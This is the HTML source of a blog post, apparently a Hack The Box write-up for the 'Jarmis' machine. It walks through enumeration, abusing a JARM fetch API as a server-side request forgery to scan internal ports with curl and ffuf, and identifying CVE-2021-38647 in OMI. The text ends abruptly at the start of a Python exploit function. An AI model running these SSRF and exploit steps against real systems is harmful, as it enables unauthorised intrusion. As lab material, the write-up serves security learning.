@@ -1,0 +1,716 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Jarmis - Flavien Jaquerod</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="HTB writeup for the hard machine &#34;Jarmis&#34;">
+		<meta property="og:url" content="//localhost:1313/posts/jarmis/">
+  <meta property="og:site_name" content="Flavien Jaquerod">
+  <meta property="og:title" content="Jarmis">
+  <meta property="og:description" content="HTB writeup for the hard machine &#34;Jarmis&#34;">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-31T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-01-31T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Machine">
+    <meta property="article:tag" content="Box">
+
+		
+  <meta itemprop="name" content="Jarmis">
+  <meta itemprop="description" content="HTB writeup for the hard machine &#34;Jarmis&#34;">
+  <meta itemprop="datePublished" content="2025-01-31T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-01-31T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2598">
+  <meta itemprop="keywords" content="CTF,HTB,Machine,Box">
+		
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Jarmis">
+  <meta name="twitter:description" content="HTB writeup for the hard machine &#34;Jarmis&#34;">
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	<link rel="stylesheet" href="/css/custom.css">
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo logo--mixed">
+		<a class="logo__link" href="/" title="Cybersecurity stuff!" rel="home">
+			<div class="logo__item logo__imagebox">
+					<img class="logo__img" src="/img/placeholder.png">
+				</div><div class="logo__item logo__text">
+					<div class="logo__title">Cybersecurity stuff!</div>
+					<div class="logo__tagline">ZeroDay Chronicles</div>
+				</div>
+		</a>
+	</div>
+		
+<nav class="menu">
+	<button class="menu__btn" aria-haspopup="true" aria-expanded="false" tabindex="0">
+		<span class="menu__btn-title" tabindex="-1">Menu</span>
+	</button>
+	<ul class="menu__list">
+		<li class="menu__item">
+			<a class="menu__link" href="/">
+				
+				<span class="menu__text">Home</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/about/">
+				
+				<span class="menu__text">About</span>
+				
+			</a>
+		</li>
+		<li class="menu__item">
+			<a class="menu__link" href="/posts/">
+				
+				<span class="menu__text">Posts</span>
+				
+			</a>
+		</li>
+	</ul>
+</nav>
+
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Jarmis</h1>
+			<div class="post__meta meta"><div class="meta__item-author meta__item">
+	<svg class="meta__icon icon icon-author" width="16" height="16" viewBox="0 0 16 16"><path d="M8 1c2 0 3.5 2 3.5 4.5S10 9 10 9c3 1 4 2 4 6H2c0-4 1-5 4-6 0 0-1.5-1-1.5-3.5S6 1 8 1"/></svg><span class="meta__text">Flavien Jaquerod</span>
+</div>
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0a14 14 0 1 1 0 28 1 1 0 0 1 0-28m0 3a3 3 0 1 0 0 22 3 3 0 0 0 0-22m1 4h-2v8.4l6.8 4.4L22 18l-6-3.8z"/></svg><time class="meta__text" datetime="2025-01-31T00:00:00Z">2025-01-31</time></div><div class="meta__item-categories meta__item"><svg class="meta__icon icon icon-category" width="16" height="16" viewBox="0 0 16 16"><path d="m7 2 1 2h8v11H0V2z"/></svg><span class="meta__text"><a class="meta__link" href="/categories/writeup/" rel="category">Writeup</a>, <a class="meta__link" href="/categories/box/" rel="category">Box</a>, <a class="meta__link" href="/categories/machine/" rel="category">Machine</a>
+	</span>
+</div></div>
+		</header>
+		
+<div class="post__toc toc">
+	<div class="toc__title">Page content</div>
+	<div class="toc__menu">
+		<nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#metasploit-custom-module">Metasploit custom module</a></li>
+        <li><a href="#gopher">Gopher</a></li>
+        <li><a href="#adding-reverse-shell">Adding reverse shell</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+	</div>
+</div><div class="content post__content clearfix">
+			<h2 id="enumeration">Enumeration</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE REASON         VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span> OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZBURYGCLr4lZI1F55bUh/6vKCfmeGumtAhhNrg9lH4UNDB/wCjPbD+xovPp3UdbrOgNdqTCdZcOk5rQDyRK2YH6tq8NlP59myIQV/zXC9WQnhxn131jf/KlW78vzWaLfMU+m52e1k+YpomT5PuSMG8EhGwE5bL4o0Jb8Unafn13CJKZ1oj3awp31fRJDzYGhTjl910PROJAzlOQinxRYdUkc4ZT0qZRohNlecGVsKPpP+2Ql+gVuusUEQt7gPFPBNKw3aLtbLVTlgEW09RB9KZe6Fuh8JszZhlRpIXDf9b2O0rINAyek8etQyFFfxkDBVueZA50wjBjtgOtxLRkvfqlxWS8R75Urz8AR2Nr23AcAGheIfYPgG8HzBsUuSN5fI8jsBCekYf/ZjPA/YDM4aiyHbUWfCyjTqtAVTf3P4iqbEkw9DONGeohBlyTtEIN7pY3YM5X3UuEFIgCjlqyjLw6QTL4cGC5zBbrZml7eZQTcmgzfU6pu220wRo5GtQ3U<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJZPKXFj3JfSmJZFAHDyqUDFHLHBRBRvlesLRVAqq0WwRFbeYdKwVIVv0DBufhYXHHcUSsBRw3/on9QM24kymD0<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEDIBMvrXLaYc6DXKPZaypaAv4yZ3DNLe1YaBpbpB8aY
+</span></span><span style="display:flex;"><span>80/tcp open  http    syn-ack ttl <span style="color:#ae81ff">63</span> nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD
+</span></span><span style="display:flex;"><span>|_http-favicon: Unknown favicon MD5: C92B85A5B907C70211F4EC25E29A8C4A
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Jarmis
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>From the <code>nmap</code>scan, we see two ports open, one running ssh and the other one http -&gt; we can immediately head over to the website and see what is running:</p>
+<p>Upon getting to the landing page of the website, we only see:</p>
+<p><img src="Jarmis_loading.png" alt=""></p>
+<p>We can then get the <code>GET</code>request with <code>BurpSuite</code>and we see:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.129.95.238</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>If-Modified-Since<span style="color:#f92672">:</span> <span style="color:#ae81ff">Wed, 22 Sep 2021 03:31:17 GMT</span>
+</span></span><span style="display:flex;"><span>If-None-Match<span style="color:#f92672">:</span> <span style="color:#ae81ff">W/&#34;614aa385-8ce&#34;</span>
+</span></span></code></pre></div><p>After checking the requests made in <code>BurpSuite</code>again, we also notice a <code>GET</code>request to <code>jarmis.htb</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /openapi.json <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">jarmis.htb</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">*/*</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.129.95.238/</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.129.95.238</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+</span></span></code></pre></div><p>We can then add <code>jarmis.htb</code>to our <code>/etc/hosts</code>file with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;10.129.95.238 jarmis.htb&#34;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><p>In the response of the <code>jarmis</code>request, we see that it loads <code>Jarmis API</code>that has the description:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#e6db74">&#34;openapi&#34;</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;3.0.2&#34;</span><span style="color:#960050;background-color:#1e0010">,</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;info&#34;</span><span style="color:#960050;background-color:#1e0010">:</span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;title&#34;</span>:<span style="color:#e6db74">&#34;Jarmis API&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;description&#34;</span>:<span style="color:#e6db74">&#34;\nJarmis helps identify malicious TLS Services by checking JARM Signatures and Metadata.\n\n## What is a jarm?\n\n* 62 Character non-random fingerprint of an SSL Service.\n* First 30 characters are Cipher and TLS Versions.\n* Last 32 characters are truncated Sha256 Hash of extensions.\n\n## Jarm Collisions\n\n* The first 30 characters, it&#39;s the same SSL Configuration.\n* The last 32 characters, it&#39;s the same server.  \n* Full collisions are possible.  That is why this service also utilzies metadata when deconfliction is necessary.\n\nBackend coded by ippsec\n&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&#34;version&#34;</span>:<span style="color:#e6db74">&#34;0.1.0&#34;</span>
+</span></span><span style="display:flex;"><span>}<span style="color:#960050;background-color:#1e0010">,...</span>
+</span></span></code></pre></div><p>==&gt; Then, when going to <code>http://jarmis.htb</code>, we are greeted by this page:</p>
+<p><img src="Jarmis_JSE.png" alt=""></p>
+<p>At this point I had to read a bit about <code>JARM</code>as I wasn&rsquo;t familiar with it, and I found some info on <a href="https://docs.binaryedge.io/modules/jarm/">this website</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>The JARM module attempts to actively fingerprint an SSL/TLS server via a series of TLS Client Hello packets to extract specific responses that can be used to quickly identify default applications or malware.
+</span></span></code></pre></div><p>==&gt; Then, we can do some exploring of the new functionalities offered by this page. There are 3 possibilities:</p>
+<ul>
+<li>Search Id</li>
+<li>Search signature</li>
+<li>Fetch <code>jarm</code></li>
+</ul>
+<p>-&gt; The first one allows to search for an id (integer) and returns the JSON details for the <code>JARM</code>signature:</p>
+<p><img src="Jarmis_searchid.png" alt=""></p>
+<p>-&gt; The <code>Fetch jarm</code>functionality seems interesting as we can input a url to it. We can test it with:</p>
+<p><img src="Jarmis_fetch.png" alt=""></p>
+<p>and we get a callback on our listener!!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rlwrap nc -lnvp <span style="color:#ae81ff">443</span> 
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.146<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.95.238<span style="color:#f92672">]</span> <span style="color:#ae81ff">40252</span>
+</span></span><span style="display:flex;"><span>E$J <span style="color:#f92672">[</span>OQJqwPdEs3, Tz18_<span style="color:#e6db74">&#39;qAu|nd|3g9kEĚ    #+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$,rs&#39;</span>/<span style="color:#f92672">(</span>0<span style="color:#e6db74">`</span>avw
+</span></span><span style="display:flex;"><span>/&lt;5<span style="color:#f92672">=</span>A
+</span></span><span style="display:flex;"><span>     10.10.14.146
+</span></span><span style="display:flex;"><span>3&amp;$ оz2ch2spdy/3spdy/2spdy/http/1.http/1.http/0.9
+</span></span><span style="display:flex;"><span>BAWui$?Z S
+</span></span><span style="display:flex;"><span>BAWui$?Z S
+</span></span></code></pre></div><p>We can see that after the successful connections have been made, we get a signature that will be updated to the database.</p>
+<p>==&gt; At this point I got stuck for a while and decided to go back to basic web enumeration, checking for other vhosts or sub directories:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://jarmis.htb                                                
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>            
+</span></span><span style="display:flex;"><span>Gobuster v3.6
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:             http://jarmis.htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:          GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:         <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:        /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:      gobuster/3.6
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:         10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Append Domain:   false
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Starting gobuster in VHOST enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">19966</span> / <span style="color:#ae81ff">19967</span> <span style="color:#f92672">(</span>99.99%<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Finished
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span></code></pre></div><p>And while <code>gobuster</code>did not yield any results, <code>dirsearch</code>got some files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dirsearch -u http://jarmis.htb                                                   
+</span></span><span style="display:flex;"><span>  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                             
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">(</span>_<span style="color:#f92672">||</span>| _<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>/_<span style="color:#f92672">(</span>_<span style="color:#f92672">||</span> <span style="color:#f92672">(</span>_| <span style="color:#f92672">)</span>       
+</span></span><span style="display:flex;"><span>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span style="color:#ae81ff">25</span> | Wordlist size: <span style="color:#ae81ff">11460</span>                                                               
+</span></span><span style="display:flex;"><span>Output File: 
+</span></span><span style="display:flex;"><span>Target: http://jarmis.htb/                                                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:56:34<span style="color:#f92672">]</span> Starting:                                                                                                                                         
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:56:46<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  178B  - /api  -&gt;  http://jarmis.htb/api/                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:56:52<span style="color:#f92672">]</span> <span style="color:#ae81ff">307</span> -    0B  - /docs/  -&gt;  http://jarmis.htb/docs
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:56:52<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  967B  - /docs
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:56:53<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    4KB - /favicon.ico  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:56:58<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  492B  - /manifest.json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:57:01<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    5KB - /openapi.json 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:57:04<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  770B  - /redoc        
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:57:05<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -   67B  - /robots.txt   
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>21:57:08<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  178B  - /static  -&gt;  http://jarmis.htb/static/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Task Completed
+</span></span></code></pre></div><p>We notice the <a href="http://jarmis.htb/docs#/"><code>/docs</code></a> endpoint, which actually contains the documentation for the <code>JARM API</code>:</p>
+<p><img src="Jarmis_doc.png" alt=""></p>
+<p>And looking at the details of the <code>Fetch JARM</code>endpoint, we see this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>Query an endpoint to retrieve its JARM and grab metadata if malicious.
+</span></span></code></pre></div><p>==&gt; To grab the metadata, there must be a connection made to the server &ndash;&gt; we can then try to see if we can get access to it.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>We can then craft a <code>cURL</code>request to scan for open ports on the server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://jarmis.htb/api/v1/fetch?endpoint<span style="color:#f92672">=</span>http://localhost:20
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;sig&#34;</span>:<span style="color:#e6db74">&#34;00000000000000000000000000000000000000000000000000000000000000&#34;</span>,<span style="color:#e6db74">&#34;endpoint&#34;</span>:<span style="color:#e6db74">&#34;null&#34;</span>,<span style="color:#e6db74">&#34;note&#34;</span>:<span style="color:#e6db74">&#34;localhost&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>curl http://jarmis.htb/api/v1/fetch?endpoint<span style="color:#f92672">=</span>http://localhost:22
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;sig&#34;</span>:<span style="color:#e6db74">&#34;00000000000000000000000000000000000000000000000000000000000000&#34;</span>,<span style="color:#e6db74">&#34;endpoint&#34;</span>:<span style="color:#e6db74">&#34;127.0.0.1:22&#34;</span>,<span style="color:#e6db74">&#34;note&#34;</span>:<span style="color:#e6db74">&#34;localhost&#34;</span><span style="color:#f92672">}</span>                                             
+</span></span></code></pre></div><p>and since we know that port 22 is running on the host, we can see a difference in the response depending on if the port is open or closed. ==&gt; We can then craft a <code>ffuf</code>wordlist to enumerate open ports on the machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>seq <span style="color:#ae81ff">65435</span> &gt; ports.txt
+</span></span><span style="display:flex;"><span>ffuf -w ports.txt -u <span style="color:#e6db74">&#34;http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:FUZZ&#34;</span> -fs <span style="color:#ae81ff">109</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
+</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
+</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
+</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
+</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.1.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : http://jarmis.htb/api/v1/fetch?endpoint<span style="color:#f92672">=</span>http://localhost:FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /home/flavien/Desktop/HTB_CTFs/Machines/Retired/Hard/Jarmis/ports.txt
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span> :: Filter           : Response size: <span style="color:#ae81ff">109</span>
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">22</span>                  <span style="color:#f92672">[</span>Status: 200, Size: 117, Words: 1, Lines: 1, Duration: 204ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">80</span>                  <span style="color:#f92672">[</span>Status: 200, Size: 117, Words: 1, Lines: 1, Duration: 90ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5985</span>                <span style="color:#f92672">[</span>Status: 200, Size: 119, Words: 1, Lines: 1, Duration: 165ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">5986</span>                <span style="color:#f92672">[</span>Status: 200, Size: 119, Words: 1, Lines: 1, Duration: 165ms<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">8001</span>                <span style="color:#f92672">[</span>Status: 200, Size: 119, Words: 1, Lines: 1, Duration: 630ms<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>and we discover 2 new open ports: <strong>5985</strong> , <strong>5986</strong> and <strong>8001</strong></p>
+<p>==&gt; Ports 5985  and 5986 immediately stand out as they are typically the ports used for <code>WinRM</code>but this is a Linux host -&gt; after some research, we discover that this is usually handled with <a href="https://www.microsoft.com/en-us/windows-server/blog/2012/06/28/open-management-infrastructure/">Open Management Infrastructure</a> and doing some more research, we discover <a href="https://www.tenable.com/plugins/nessus/153486">CVE-2021-38647</a> which timeline coincides with the box&rsquo;s release.</p>
+<p>We can look at some scripts and the documentation of this attack to see that we need to make a <code>POST</code>request to the end server. We then need to figure out a way to do so as currently it is only accessible through the <code>cURL</code> request.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(target, command):
+</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/soap+xml;charset=UTF-8&#39;</span>}
